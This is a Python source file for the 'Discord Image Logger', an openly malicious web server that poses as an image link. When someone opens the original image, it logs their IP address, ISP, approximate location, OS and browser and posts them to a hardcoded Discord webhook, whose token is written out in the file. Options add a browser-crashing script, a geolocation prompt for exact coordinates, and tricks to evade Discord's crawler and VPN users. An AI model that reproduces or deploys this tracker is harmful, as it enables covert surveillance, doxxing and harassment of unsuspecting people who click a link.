# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1109688102345265152/a9bYXw5JK26nQmHq1qPAy2l43A5o7vFALKF_E1duGI1sOOdrbzqIetA8NGbABxMZAxEd",
    "image": "data:image/png;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": False, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
